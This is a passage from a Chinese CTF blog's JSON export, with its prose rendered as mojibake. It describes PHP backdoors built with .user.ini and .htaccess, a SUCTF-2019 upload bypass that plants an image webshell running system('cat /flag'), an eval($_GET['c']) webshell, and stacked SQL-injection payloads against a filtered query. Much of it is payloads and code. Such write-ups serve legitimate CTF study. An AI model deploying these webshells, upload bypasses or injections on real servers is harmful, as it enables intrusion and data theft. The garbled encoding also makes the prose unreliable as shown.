æ–‡ä»¶æ‰€åœ¨ç›®å½•å¼€å§‹ä¸€ç›´ä¸Šå‡åˆ° web æ ¹ç›®å½•ï¼ˆ$_SERVER[â€˜DOCUMENT_ROOTâ€™] æ‰€æŒ‡å®šçš„ï¼‰ã€‚å¦‚æœè¢«æ‰§è¡Œçš„ PHP æ–‡ä»¶åœ¨ web æ ¹ç›®å½•ä¹‹å¤–ï¼Œåˆ™åªæ‰«æè¯¥ç›®å½•ã€‚</p>\n<p>åœ¨ .user.ini é£æ ¼çš„ INI æ–‡ä»¶ä¸­åªæœ‰å…·æœ‰ <strong>PHP_INI_PERDIR</strong> å’Œ <strong>PHP_INI_USER</strong> æ¨¡å¼çš„ INI è®¾ç½®å¯è¢«è¯†åˆ«ã€‚</p>\n<p>ä¸¤ä¸ªæ–°çš„ INI æŒ‡ä»¤ï¼Œuser_ini.filename å’Œ user_ini.cache_ttl æ§åˆ¶ç€ç”¨æˆ· INI æ–‡ä»¶çš„ä½¿ç”¨ã€‚</p>\n<p>user_ini.filename è®¾å®šäº† PHP ä¼šåœ¨æ¯ä¸ªç›®å½•ä¸‹æœå¯»çš„æ–‡ä»¶åï¼›å¦‚æœè®¾å®šä¸ºç©ºå­—ç¬¦ä¸²åˆ™ PHP ä¸ä¼šæœå¯»ã€‚é»˜è®¤å€¼æ˜¯ .user.iniã€‚</p>\n<p>user_ini.cache_ttl æ§åˆ¶ç€é‡æ–°è¯»å–ç”¨æˆ· INI æ–‡ä»¶çš„é—´éš”æ—¶é—´ã€‚é»˜è®¤æ˜¯ 300 ç§’ï¼ˆ5 åˆ†é’Ÿï¼‰ã€‚</p>\n</blockquote>\n<p>åŒæ—¶ä¸php.iniä¸åŒçš„æ˜¯.user.iniæ˜¯ä¸€ä¸ªèƒ½åŠ¨æ€åŠ è½½çš„é…ç½®æ–‡ä»¶ï¼Œä¿®æ”¹æ–‡ä»¶å†…å®¹ä¹‹åä¸éœ€è¦é‡å¯ä¸­é—´ä»¶åªéœ€è¦ç­‰å¾…  <code>user_ini.cache_ttl</code> æ—¶é—´å³å¯è¢«åŠ è½½ã€‚</p>\n<p>ä¹Ÿå°±æ˜¯è¯´ <code>.user.ini</code> å…¶å®å°±æ˜¯ä¸€ä¸ªæˆ‘ä»¬å¯ä»¥è‡ªå®šä¹‰phpé…ç½®çš„æ–‡ä»¶ã€‚</p>\n<h3 id=\"å¦‚ä½•åˆ©ç”¨ï¼Ÿ\"><a href=\"#å¦‚ä½•åˆ©ç”¨ï¼Ÿ\" class=\"headerlink\" title=\"å¦‚ä½•åˆ©ç”¨ï¼Ÿ\"></a>å¦‚ä½•åˆ©ç”¨ï¼Ÿ</h3><p>ä»phpé…ç½®åˆ—è¡¨é‡Œæˆ‘ä»¬å‘ç°æ— æ³•é…ç½®ä¸€äº›å…³é”®çš„é…ç½®ï¼Œä½†æ˜¯åœ¨æ„æˆæ–‡ä»¶åé—¨æ—¶æˆ‘ä»¬æ‰¾åˆ°äº†ä¸¤ä¸ªæˆ‘ä»¬å¯ä»¥è‡ªå·±é…ç½®çš„é€‰é¡¹ï¼š</p>\n<p><img src=\"https://images2015.cnblogs.com/blog/804631/201602/804631-20160212221854714-1902413142.png\" alt></p>\n<p><strong>auto_prepend_file</strong></p>\n<blockquote>\n<p>Specifies the name of a file that is automatically parsed before the main file. The file is included as if it was called with the require function, so include_path is used.</p>\n<p>The special value none disables auto-prepending.</p>\n</blockquote>\n<p>æŒ‡å®šä¸€ä¸ªæ–‡ä»¶åœ¨ä¸»æ–‡ä»¶ä¹‹å‰è‡ªåŠ¨è§£æï¼Œè¿™ä¸ªè¢«åŒ…å«çš„æ–‡ä»¶ç›¸å½“äºåœ¨ä¸»æ–‡ä»¶ä¹‹å‰è°ƒç”¨äº† <code>require</code> å‡½æ•°ï¼Œè·¯å¾„å—åˆ°<code>include_path</code> é™åˆ¶ã€‚ <code>include_path</code> ä¼šæŒ‡å®š <em>require, include, fopen(), file(), readfile() and file_get_contents()</em> è¿™äº›å‡½æ•°æ‰§è¡Œæ—¶å»å“ªå¯»æ‰¾æ–‡ä»¶ã€‚</p>\n<p><strong>auto_append_file</strong></p>\n<blockquote>\n<p>Specifies the name of a file that is automatically parsed after the main file. The file is included as if it was called with the require function, so include_path is used.</p>\n<p>The special value none disables auto-appending.</p>\n<p>Note: If the script is terminated with exit(), auto-append will not occur.</p>\n</blockquote>\n<p>æˆ‘ä»¬åˆ©ç”¨çš„é‡ç‚¹æ˜¯ç¬¬ä¸€ä¸ªé…ç½®ï¼ŒåŒæ—¶æˆ‘ä»¬ä»æ–‡æ¡£ä¹Ÿå¯ä»¥çœ‹å‡ºåœ¨åˆ©ç”¨æ—¶æˆ‘ä»¬éœ€è¦ä¸€ä¸ª<strong>æ­£å¸¸</strong>çš„phpæ–‡ä»¶æ¥åŒ…å«æˆ‘ä»¬çš„webshellï¼Œ*<em>ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬åªæœ‰åœ¨æ–‡ä»¶å¤¹é‡Œæœ‰å¯ä»¥æ­£å¸¸è§£æ(ä½¿ç”¨fastcgiæ¨¡å¼è§£æ)çš„phpæ–‡ä»¶æ—¶æ‰èƒ½è¿™æ ·åˆ©ç”¨ã€‚<br>*</em><br>ä½¿ç”¨æ—¶ä¹Ÿç®€å•ç›´æ¥å†™åœ¨<code>.user.ini</code>ä¸­</p>\n<pre><code>auto_prepend_file=webshell.jpg</code></pre><h3 id=\"æ•ˆæœå¦‚ä½•ï¼Ÿ\"><a href=\"#æ•ˆæœå¦‚ä½•ï¼Ÿ\" class=\"headerlink\" title=\"æ•ˆæœå¦‚ä½•ï¼Ÿ\"></a>æ•ˆæœå¦‚ä½•ï¼Ÿ</h3><p>ç¯å¢ƒwin10+php-5.45-nts+Nginx</p>\n<p>ç»“æœå¦‚ä¸‹ï¼š</p>\n<p><img src=\"https://wx3.sinaimg.cn/mw690/006boCb9ly1g7c0otmfxdj313c0f476s.jpg\" alt=\"æ•ˆæœå¦‚å›¾\"></p>\n<h2 id=\"htaccess\"><a href=\"#htaccess\" class=\"headerlink\" title=\".htaccess\"></a>.htaccess</h2><h3 id=\"htaccessæ˜¯ä»€ä¹ˆï¼Ÿ\"><a href=\"#htaccessæ˜¯ä»€ä¹ˆï¼Ÿ\" class=\"headerlink\" title=\".htaccessæ˜¯ä»€ä¹ˆï¼Ÿ\"></a>.htaccessæ˜¯ä»€ä¹ˆï¼Ÿ</h3><p>ç¿»é˜…apacehå®˜æ–¹æ–‡æ¡£<a href=\"https://httpd.apache.org/docs/current/howto/htaccess.html\" target=\"_blank\" rel=\"noopener\">https://httpd.apache.org/docs/current/howto/htaccess.html</a>å¯çŸ¥</p>\n<blockquote>\n<p>.htaccess files provide a way to make configuration changes on a per-directory basis.</p>\n</blockquote>\n<p><code>.htaccess</code> æ–‡ä»¶æä¾›äº†ä¸€ç§ç›®å½•çº§åˆ«çš„ä¿®æ”¹é…ç½®çš„æ–¹å¼ã€‚ä¸€ä¸ªæ–‡ä»¶ï¼ŒåŒ…å«ä¸€æ¡æˆ–å¤šæ¡é…ç½®æŒ‡ä»¤ï¼Œæ”¾ç½®äºç›®å½•ä¸‹ï¼Œè¿™äº›é…ç½®æŒ‡ä»¤å¯¹å½“å‰ç›®å½•å’Œå…¶æ‰€æœ‰å­ç›®å½•ç”Ÿæ•ˆã€‚</p>\n<h3 id=\"SetHandler\"><a href=\"#SetHandler\" class=\"headerlink\" title=\"SetHandler\"></a>SetHandler</h3><p>æˆ‘ä»¬åœ¨ <code>.htaccess</code> æ–‡ä»¶ä¸­å¯ä»¥é€šè¿‡å¢åŠ  <code>handler-name</code> æ¥é…ç½®æ–‡ä»¶çš„è§£ææ–¹å¼ã€‚æ¯”å¦‚ä½ æœ‰ä¸€ä¸ªç›®å½•ï¼Œä½ æƒ³è®©å®ƒè¢« <code>imagemap rule files</code> è§£æï¼Œä½ å¯ä»¥åœ¨åœ¨ <code>.htaccess</code> æ–‡ä»¶ä¸­åŠ å…¥è¿™æ®µä»£ç ï¼š</p>\n<pre><code>SetHandler imap-file</code></pre><p>åŒæ ·çš„ï¼Œ<code>AddType</code> å¯æŒ‡ç¤ºæ–‡ä»¶ç®¡ç†ç³»ç»Ÿå¯¹ç»™å‡ºçš„æ–‡ä»¶åä»¥é€‰å®šçš„æ–‡ä»¶ç±»å‹è¿›è¡Œè§£æã€‚</p>\n<pre><code>AddType image/gif .gif</code></pre><p>åŒæ—¶ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥åœ¨ä»¥ <code>php</code> ä½œä¸º <code>Apacec module</code> æ—¶ï¼Œé€šè¿‡ <code>php_value</code> æ¥é…ç½®PHPçš„é…ç½®é€‰é¡¹ï¼š</p>\n<pre><code>php_value name value</code></pre><p>è®¾ç½®æŒ‡å®šçš„å€¼. åªé€‚åˆäº PHP_INI_ALL å’Œ PHP_INI_PERDIR ç±»å‹æŒ‡ä»¤</p>\n<h3 id=\"å¦‚ä½•åˆ©ç”¨ï¼Ÿ-1\"><a href=\"#å¦‚ä½•åˆ©ç”¨ï¼Ÿ-1\" class=\"headerlink\" title=\"å¦‚ä½•åˆ©ç”¨ï¼Ÿ\"></a>å¦‚ä½•åˆ©ç”¨ï¼Ÿ</h3><p><strong>æ–‡ä»¶è§£æä¸Šä¼ æ¼æ´</strong></p>\n<p>.htaccessæ–‡ä»¶ä¸­å®šä¹‰äº†å°†ä¸Šä¼ çš„æ–‡ä»¶åç¼€åä¸º .jpg æ ¼å¼çš„æ–‡ä»¶ä»¥ php æ ¼å¼æ¥è§£ææ–‡ä»¶ã€‚.htaccess æ˜¯apacheæœåŠ¡å™¨ä¸­çš„ä¸€ä¸ªé…ç½®æ–‡ä»¶ï¼Œä¸æ˜¯ä¸Šä¼ çš„æ–‡ä»¶çš„é»‘åå•ä¹‹å†…ï¼Œæ‰€ä»¥è¯¥ç±»å‹æ–‡ä»¶å¯ä»¥ä¸Šä¼ æˆåŠŸã€‚</p>\n<pre><code>AddType  application/x-httpd-php  .jpg</code></pre><p>è¿˜å¯ä»¥è¿™æ ·ï¼š</p>\n<pre><code># FileMatch å‚æ•°å³ä¸ºæ–‡ä»¶åçš„æ­£åˆ™åŒ¹é…\n&lt;FilesMatch &quot;sniperoj&quot;&gt;\n  SetHandler application/x-httpd-php\n&lt;/FilesMatch&gt;\n\n// sniperoj\n&lt;?php eval($_GET[&apos;c&apos;]);?&gt;</code></pre><p><strong>æ–‡ä»¶åŒ…å«</strong></p>\n<pre><code>index.php: (empty)\n\n.htaccess:\n\nphp_value auto_append_file /etc/hosts</code></pre><p><strong>PHP ä»£ç æ‰§è¡Œ</strong></p>\n<pre><code>index.php: (empty)\n\n.htaccess:\n\nphp_value auto_append_file .htaccess\n#&lt;?php phpinfo();</code></pre><h2 id=\"å‚è€ƒ\"><a href=\"#å‚è€ƒ\" class=\"headerlink\" title=\"å‚è€ƒ\"></a>å‚è€ƒ</h2><blockquote>\n<p><a href=\"https://httpd.apache.org/docs/current/howto/htaccess.html\" target=\"_blank\" rel=\"noopener\">https://httpd.apache.org/docs/current/howto/htaccess.html</a></p>\n<p><a href=\"http://www.justanotherhacker.com/2011/05/htaccess-based-attacks.html\" target=\"_blank\" rel=\"noopener\">http://www.justanotherhacker.com/2011/05/htaccess-based-attacks.html</a></p>\n<p><a href=\"https://httpd.apache.org/docs/current/mod/mod_authn_core.html#authtype\" target=\"_blank\" rel=\"noopener\">https://httpd.apache.org/docs/current/mod/mod_authn_core.html#authtype</a></p>\n<p><a href=\"https://httpd.apache.org/docs/current/mod/core.html#sethandler\" target=\"_blank\" rel=\"noopener\">https://httpd.apache.org/docs/current/mod/core.html#sethandler</a></p>\n<p><a href=\"https://httpd.apache.org/docs/current/mod/mod_mime.html#addhandler\" target=\"_blank\" rel=\"noopener\">https://httpd.apache.org/docs/current/mod/mod_mime.html#addhandler</a></p>\n<p><a href=\"https://www.php.net/manual/en/configuration.changes.php\" target=\"_blank\" rel=\"noopener\">https://www.php.net/manual/en/configuration.changes.php</a></p>\n<p><a href=\"https://www.cnblogs.com/xia0zhiwei/p/4713438.html\" target=\"_blank\" rel=\"noopener\">https://www.cnblogs.com/xia0zhiwei/p/4713438.html</a></p>\n<p><a href=\"http://www.vuln.cn/6001\" target=\"_blank\" rel=\"noopener\">http://www.vuln.cn/6001</a></p>\n</blockquote>\n","text":"ä¸¤ç§åˆ©ç”¨æ–‡ä»¶æ„æˆPHPåé—¨çš„æ–¹æ³•ï¼š.htaccess &amp; .user.ini.user.iniä»¥ä¸‹éƒ¨åˆ†æ‘˜å–äºPç¥çš„åšå®¢http://www.vuln.cn/6001.user.ini æ˜¯ä»€ä¹ˆï¼Ÿåªè¦æ˜¯ä»¥fastcgiè¿è¡Œçš„phpéƒ½å¯ä»¥ç”¨.user.iniæ„æˆæ–‡ä»¶åé—¨çš„æ–¹æ³•ã€‚","link":"","raw":null,"photos":[],"categories":[{"name":"ctf","slug":"ctf","count":24,"path":"api/categories/ctf.json"}],"tags":[{"name":"php","slug":"php","count":7,"path":"api/tags/php.json"}]},{"title":"SUCTF-2019","slug":"suctf-2019-WP","date":"2019-09-10T10:15:38.000Z","updated":"2019-09-11T14:54:46.974Z","comments":true,"path":"api/articles/suctf-2019-WP.json","excerpt":"","keywords":null,"cover":"https://images2015.cnblogs.com/blog/804631/201602/804631-20160212221854714-1902413142.png","content":"<h1 id=\"SUCTF-2019-WP\"><a href=\"#SUCTF-2019-WP\" class=\"headerlink\" title=\"SUCTF-2019 WP\"></a>SUCTF-2019 WP</h1><p>9/10/2019 6:15:38 PM </p>\n<h2 id=\"checkin\"><a href=\"#checkin\" class=\"headerlink\" title=\"checkin\"></a>checkin</h2><p>å…ˆä¸Šä¼ ä¸€ä¸ª <code>websell.php</code>ï¼Œæ˜¾ç¤ºåç¼€ä¸åˆæ³•(æ”¹<code>php5</code>ã€<code>php4</code>ã€<code>content-type</code>è¿™äº›éƒ½ä¸è¡Œ)ã€‚</p>\n<p>å†ä¸Šä¼ ä¸€ä¸ªå›¾ç‰‡é©¬å‘ç°æ˜¾ç¤º <code>&amp;lt;? in contents!</code> ï¼Œå°±æ˜¯è¯´<code>&lt; ?</code>ä¸èƒ½è¿ç»­å­˜åœ¨ã€‚</p>\n<p>æˆ‘ä»¬é€šè¿‡<code>&lt;script language=&#39;php&#39;&gt;&lt;/script&gt;</code>æ¥ç»•è¿‡å¯¹<code>&lt;?</code>çš„æ£€æµ‹ã€‚è¿™æ¬¡æˆ‘ä»¬å¾—åˆ°å›æ˜¾<br>    exif_imagetype:not image!</p>\n<p><code>exif_imagetype</code>ç”¨æ¥åˆ¤æ–­å›¾ç‰‡ç±»å‹ï¼Œä»–è¯»å–ä¸€ä¸ªå›¾åƒçš„ç¬¬ä¸€ä¸ªå­—èŠ‚å¹¶æ£€æŸ¥å…¶ç­¾åã€‚åªè¦æˆ‘ä»¬æ·»åŠ ä¸€ä¸ªå›¾ç‰‡å¤´å°±å¯ä»¥ç»•è¿‡ï¼Œæ¯”å¦‚æ·»åŠ <code>GIF89a</code>.åœ¨æ·»åŠ å®Œä¹‹åæˆ‘ä»¬ä¸Šä¼ æˆåŠŸï¼Œæ­¤æ—¶çš„æ–‡ä»¶ç›®å½•ä¸‹é™¤äº†æˆ‘ä»¬ä¸Šä¼ çš„<code>webshell</code>è¿˜æœ‰ä¸€ä¸ª<code>index.php</code>.</p>\n<h3 id=\"user-ini-æ–‡ä»¶æ„æˆçš„åé—¨\"><a href=\"#user-ini-æ–‡ä»¶æ„æˆçš„åé—¨\" class=\"headerlink\" title=\".user.ini æ–‡ä»¶æ„æˆçš„åé—¨\"></a>.user.ini æ–‡ä»¶æ„æˆçš„åé—¨</h3><p>è¯¦æƒ…çœ‹pç¥è¿™ç¯‡æ–‡ç« <a href=\"http://www.vuln.cn/6001\" title=\"ç‚¹è¿™é‡Œ\" target=\"_blank\" rel=\"noopener\">http://www.vuln.cn/6001</a></p>\n<blockquote>\n<p>é™¤äº†ä¸» php.ini ä¹‹å¤–ï¼ŒPHP è¿˜ä¼šåœ¨æ¯ä¸ªç›®å½•ä¸‹æ‰«æ INI æ–‡ä»¶ï¼Œä»è¢«æ‰§è¡Œçš„ PHP æ–‡ä»¶æ‰€åœ¨ç›®å½•å¼€å§‹ä¸€ç›´ä¸Šå‡åˆ° web æ ¹ç›®å½•ï¼ˆ$_SERVER[â€˜DOCUMENT_ROOTâ€™] æ‰€æŒ‡å®šçš„ï¼‰ã€‚å¦‚æœè¢«æ‰§è¡Œçš„ PHP æ–‡ä»¶åœ¨ web æ ¹ç›®å½•ä¹‹å¤–ï¼Œåˆ™åªæ‰«æè¯¥ç›®å½•ã€‚</p>\n</blockquote>\n<blockquote>\n<p>åœ¨ .user.ini é£æ ¼çš„ INI æ–‡ä»¶ä¸­åªæœ‰å…·æœ‰ PHP_INI_PERDIR å’Œ PHP_INI_USER æ¨¡å¼çš„ INI è®¾ç½®å¯è¢«è¯†åˆ«ã€‚</p>\n</blockquote>\n<p><code>.user.ini</code>ç±»ä¼¼ä¸€ä¸ªç”¨æˆ·è‡ªå®šä¹‰çš„<code>php.ini</code>ã€‚æˆ‘ä»¬èƒ½å¤Ÿè‡ªå®šä¹‰çš„è®¾ç½®æ˜¯â€<code>PHP_INI_PERDIR</code> ã€ <code>PHP_INI_USER</code>â€œçš„è®¾ç½®ã€‚ï¼ˆä¸Šé¢è¡¨æ ¼ä¸­æ²¡æœ‰æåˆ°çš„<code>PHP_INI_PERDIR</code>ä¹Ÿå¯ä»¥åœ¨<code>.user.ini</code>ä¸­è®¾ç½®ï¼‰</p>\n<p>å®é™…ä¸Šï¼Œé™¤äº†<code>PHP_INI_SYSTEM</code>ä»¥å¤–çš„æ¨¡å¼ï¼ˆåŒ…æ‹¬<code>PHP_INI_ALL</code>ï¼‰éƒ½æ˜¯å¯ä»¥é€šè¿‡<code>.user.ini</code>æ¥è®¾ç½®çš„ã€‚</p>\n<p>å’Œ<code>php.ini</code>ä¸åŒçš„æ˜¯ï¼Œ<code>.user.ini</code>æ˜¯ä¸€ä¸ªèƒ½è¢«åŠ¨æ€åŠ è½½çš„iniæ–‡ä»¶ã€‚ä¹Ÿå°±æ˜¯è¯´æˆ‘ä¿®æ”¹äº†<code>.user.ini</code>åï¼Œä¸éœ€è¦é‡å¯æœåŠ¡å™¨ä¸­é—´ä»¶ï¼Œåªéœ€è¦ç­‰å¾…<code>user_ini.cache_ttl</code>æ‰€è®¾ç½®çš„æ—¶é—´ï¼ˆé»˜è®¤ä¸º300ç§’ï¼‰ï¼Œå³å¯è¢«é‡æ–°åŠ è½½ã€‚</p>\n<p><img src=\"https://images2015.cnblogs.com/blog/804631/201602/804631-20160212221854714-1902413142.png\" alt=\"phpä¸­ä¸¤ä¸ªé…ç½®\"></p>\n<p><code>auto_prepend_file</code> æ„å‘³è¿™æ˜¯åœ¨phpè„šæœ¬æ‰§è¡Œå‰ä¼šæ‰§è¡Œè¿™ä¸ªå‚æ•°è®¾ç½®çš„è„šæœ¬ï¼Œç±»ä¼¼äºåœ¨æ–‡ä»¶å‰è°ƒç”¨<code>require()</code>ç„¶åè¿™ä¸ªå‚æ•°çš„è„šæœ¬æ‰€åœ¨ç›®å½•å—<code>include_path</code>é™åˆ¶<br><code>append</code>æ˜¯åœ¨<code>php</code>è„šæœ¬æ‰§è¡Œåæ‰æ‰§è¡Œçš„ï¼Œä½†æ˜¯è¦æ³¨æ„çš„æ˜¯é‡åˆ°<code>exit()</code>çš„æ—¶å€™ï¼Œè¿™ä¸ªè„šæœ¬ä¹Ÿä¸èƒ½è¿è¡Œ</p>\n<p>ä½¿ç”¨çš„æ—¶å€™ç›´æ¥å†™åœ¨<code>.user.ini</code>ä¸­</p>\n<pre><code>auto_prepend_file=webshell.gif</code></pre><p>webshell.gifæ˜¯è¦åŒ…å«çš„æ–‡ä»¶.æ‰€ä»¥æˆ‘ä»¬å¯ä»¥å€ŸåŠ©è¿™ä¸ªé…ç½®é¡¹æ¥è®©æ‰€æœ‰çš„phpæ–‡ä»¶éƒ½â€œè‡ªåŠ¨â€åŒ…å«è¿™ä¸ªæ–‡ä»¶ã€‚ğŸ‘</p>\n<p>æŸç½‘ç«™é™åˆ¶ä¸å…è®¸ä¸Šä¼ .phpæ–‡ä»¶ï¼Œä½ ä¾¿å¯ä»¥ä¸Šä¼ ä¸€ä¸ª.user.iniï¼Œå†ä¸Šä¼ ä¸€ä¸ªå›¾ç‰‡é©¬ï¼ŒåŒ…å«èµ·æ¥è¿›è¡Œgetshellã€‚ä¸è¿‡å‰ææ˜¯å«æœ‰.user.iniçš„æ–‡ä»¶å¤¹ä¸‹éœ€è¦æœ‰æ­£å¸¸çš„phpæ–‡ä»¶ï¼Œå¦åˆ™ä¹Ÿä¸èƒ½åŒ…å«äº†ã€‚</p>\n<p>.htaccessæ–‡ä»¶æ„æˆçš„åé—¨çœ‹è¿™é‡Œï¼š<a href=\"https://github.com/sektioneins/pcc/wiki/PHP-htaccess-injection-cheat-sheet\" title=\".htaccess\">https://github.com/sektioneins/pcc/wiki/PHP-htaccess-injection-cheat-sheet</a>è¿™ä¸ªåªèƒ½ç”¨äºApache</p>\n<p>çœ‹åˆ°è¿™é‡Œæˆ‘ä»¬å‘ç°å½“å‰ç›®å½•ä¸‹ç¡®å®æœ‰<code>index.php</code>å¯ä»¥åˆ©ç”¨ï¼Œäºæ˜¯æˆ‘ä»¬å¼€å§‹å§ğŸˆ</p>\n<h3 id=\"å¼€å§‹ä¸Šä¼ \"><a href=\"#å¼€å§‹ä¸Šä¼ \" class=\"headerlink\" title=\"å¼€å§‹ä¸Šä¼ \"></a>å¼€å§‹ä¸Šä¼ </h3><p>æˆ‘ä»¬å…ˆæ„é€ <code>.user.ini</code>æ–‡ä»¶</p>\n<pre><code>GIF89a\nauto_prepend_file=CK.jpg</code></pre><p>ç„¶åå°†å…¶ä¸Šä¼ </p>\n<p>æ¥ç€æ„é€ å›¾ç‰‡é©¬<code>CK.jpg</code></p>\n<pre><code>GIF89a\n&lt;script language=&apos;php&apos;&gt;\n    system(&apos;cat /flag&apos;);\n&lt;/script&gt;</code></pre><p>æˆåŠŸä¸Šä¼ ä¹‹åæˆ‘ä»¬è®¿é—®ä¸Šä¼ åçš„é¡µé¢å³å¯çœ‹åˆ°flagã€‚</p>\n<h2 id=\"easy-sql\"><a href=\"#easy-sql\" class=\"headerlink\" title=\"easy sql\"></a>easy sql</h2><p>å­˜åœ¨å †å æ³¨å…¥ï¼Œæµ‹è¯•<code>1;show tables;</code>å›æ˜¾</p>\n<pre><code>Array ( [0] =&gt; 1 ) Array ( [0] =&gt; Flag ) </code></pre><p>æµ‹è¯•<code>1;select * from Flag;</code>,flagè¢«è¿‡æ»¤äº†</p>\n<p><code>.index.php.swp</code>å­˜åœ¨æºç æ³„éœ²,æºç å¦‚ä¸‹  </p>\n<pre><code>&lt;?php\n    session_start();\n\n    include_once &quot;config.php&quot;;\n\n    $post = array();\n    $get = array();\n    global $MysqlLink;\n\n    //GetPara();\n    $MysqlLink = mysqli_connect(&quot;localhost&quot;,$datauser,$datapass);\n    if(!$MysqlLink){\n        die(&quot;Mysql Connect Error!&quot;);\n    }\n    $selectDB = mysqli_select_db($MysqlLink,$dataName);\n    if(!$selectDB){\n        die(&quot;Choose Database Error!&quot;);\n    }\n\n    foreach ($_POST as $k=&gt;$v){\n        if(!empty($v)&amp;&amp;is_string($v)){\n            $post[$k] = trim(addslashes($v));\n        }\n    }\n    foreach ($_GET as $k=&gt;$v){\n        }\n    }\n    //die();\n    ?&gt;\n\n&lt;html&gt;\n&lt;head&gt;\n&lt;/head&gt;\n\n&lt;body&gt;\n\n&lt;a&gt; Give me your flag, I will tell you if the flag is right. &lt;/ a&gt;\n&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;\n&lt;input type=&quot;text&quot; name=&quot;query&quot;&gt;\n&lt;input type=&quot;submit&quot;&gt;\n&lt;/form&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n\n&lt;?php\n\n    if(isset($post[&apos;query&apos;])){\n        $BlackList = &quot;prepare|flag|unhex|xml|drop|create|insert|like|regexp|outfile|readfile|where|from|union|update|delete|if|sleep|extractvalue|updatexml|or|and|&amp;|\\&quot;&quot;;\n        //var_dump(preg_match(&quot;/{$BlackList}/is&quot;,$post[&apos;query&apos;]));\n        if(preg_match(&quot;/{$BlackList}/is&quot;,$post[&apos;query&apos;])){\n            //echo $post[&apos;query&apos;];\n            die(&quot;Nonono.&quot;);\n        }\n        if(strlen($post[&apos;query&apos;])&gt;40){\n            die(&quot;Too long.&quot;);\n        }\n        $sql = &quot;select &quot;.$post[&apos;query&apos;].&quot;||flag from Flag&quot;;\n        mysqli_multi_query($MysqlLink,$sql);\n        do{\n            if($res = mysqli_store_result($MysqlLink)){\n                while($row = mysqli_fetch_row($res)){\n                    print_r($row);\n                }\n            }\n        }while(@mysqli_next_result($MysqlLink));\n\n    }\n\n    ?&gt;</code></pre><p>æŸ¥è¯¢è¯­å¥ä¸ºï¼š<code>$sql = &quot;select &quot;.$post[&#39;query&#39;].&quot;||flag from Flag&quot;;</code></p>\n<h3 id=\"logical-OR\"><a href=\"#logical-OR\" class=\"headerlink\" title=\"|| logical OR\"></a>|| logical OR</h3><pre><code>mysql&gt; SELECT 1 OR 1;\n        -&gt; 1\nmysql&gt; SELECT 1 OR 0;\n        -&gt; 1\nmysql&gt; SELECT 0 OR 0;\n        -&gt; 0\nmysql&gt; SELECT 0 OR NULL;\n        -&gt; NULL\nmysql&gt; SELECT 1 OR NULL;\n        -&gt; 1</code></pre><blockquote>\n<p>Logical OR. When both operands are non-NULL, the result is 1 if any operand is nonzero, and 0 otherwise. With a NULL operand, the result is 1 if the other operand is nonzero, and NULL otherwise. If both operands are NULL, the result is NULL. </p>\n</blockquote>\n<h3 id=\"å¦‚ä½•åšï¼Ÿ\"><a href=\"#å¦‚ä½•åšï¼Ÿ\" class=\"headerlink\" title=\"å¦‚ä½•åšï¼Ÿ\"></a>å¦‚ä½•åšï¼Ÿ</h3><p>å…ˆæ¥çœ‹ä¸€ä¸ªmsqlçš„é…ç½®</p>\n<p><strong>PIPES_AS_CONCAT</strong></p>\n<blockquote>\n<p>Treat || as a string concatenation operator (same as CONCAT()) rather than as a synonym for OR. </p>\n</blockquote>\n<p>å¦‚æœé…ç½®äº†<code>sql_mode=PIPES_AS_CONCAT</code>ï¼ŒMysqlä¼šæŠŠé€»è¾‘æˆ–å½“ä½œä¸€ä¸ªå­—ç¬¦ä¸²é“¾æ¥å‡½æ•°å¯¹å¾…ã€‚  </p>\n<p><strong>CONCAT(str1,str2,â€¦)</strong></p>\n<blockquote>\n<p>Returns the string that results from concatenating the arguments. May have one or more arguments. If all arguments are nonbinary strings, the result is a nonbinary string. If the arguments include any binary strings, the result is a binary string. A numeric argument is converted to its equivalent nonbinary string form. </p>\n</blockquote>\n<p><code>CONCAT()</code> returns NULL if any argument is NULL. </p>\n<pre><code>mysql&gt; SELECT CONCAT(&apos;My&apos;, &apos;S&apos;, &apos;QL&apos;);\n        -&gt; &apos;MySQL&apos;\nmysql&gt; SELECT CONCAT(&apos;My&apos;, NULL, &apos;QL&apos;);\n        -&gt; NULL\nmysql&gt; SELECT CONCAT(14.3);\n        -&gt; &apos;14.3&apos;</code></pre><p>æˆ‘ä»¬é€šè¿‡<code>sql_mode=PIPES_AS_CONCAT</code>æ¥å°†flagå¸¦å‡ºæ¥</p>\n<p>payload:  <code>1;sql_mode=PIPES_AS_CONCAT;select 1</code>  </p>\n<p>è¯­å¥ä¸º:</p>\n<pre><code>select 1;sql_mode=PIPES_AS_CONCAT;select 1;|| flag rom Flag;</code></pre><h3 id=\"éé¢„æœŸ\"><a href=\"#éé¢„æœŸ\" class=\"headerlink\" title=\"éé¢„æœŸ\"></a>éé¢„æœŸ</h3><p>payload:<code>*,1</code>æ„é€ <code>select *,1 || flag from Flag;</code> å³å¯æŸ¥å‡ºå…¨éƒ¨å†…å®¹ã€‚</p>\n","text":"SUCTF-2019 WP9/10/2019 6:15:38 PM checkinå…ˆä¸Šä¼ ä¸€ä¸ª websell.phpï¼Œæ˜¾ç¤ºåç¼€ä¸åˆæ³•(æ”¹php5ã€php4ã€content-typeè¿™äº›éƒ½ä¸è¡Œ)ã€‚å†ä¸Šä¼ ä¸€ä¸ªå›¾ç‰‡é©¬å‘ç°æ˜¾ç¤º &amp;lt;? in contents! ï¼Œå°±æ˜¯è¯´&lt","link":"","raw":null,"photos":[],"categories":[{"name":"WP","slug":"WP","count":7,"path":"api/categories/WP.json"}],"tags":[{"name":"php","slug":"php","count":7,"path":"api/tags/php.json"}]},{"title":"TokyoWestern 2019","slug":"TokyoWesterns-2019","date":"2019-09-05T09:20:26.000Z","updated":"2019-09-11T04:43:53.977Z","comments":true,"path":"api/articles/TokyoWesterns-2019.json","excerpt":"","keywords":null,"cover":"http://wx3.sinaimg.cn/mw690/006boCb9ly1g6vh6cdqqvj31d60dmwj2.jpg","content":"<h1 id=\"TokyoWestern-2019\"><a href=\"#TokyoWestern-2019\" class=\"headerlink\" title=\"TokyoWestern 2019\"></a>TokyoWestern 2019</h1><p>9/5/2019 5:20:26 PM ğŸ¨</p>\n<h2 id=\"ji2xji2\"><a href=\"#ji2xji2\" class=\"headerlink\" title=\"ji2xji2\"></a>ji2xji2</h2><p>æ‹¿åˆ°é¢˜ç›®ç¬¬ä¸€ååº”å°±æ˜¯XXEï¼Œç›´æ¥æ‹¿ç€ä¹‹å‰åšå®¢çš„payloadä¸€é¡¿è¯•ï¼Œç»“æœå¾—åˆ°äº†<code>failed to decode 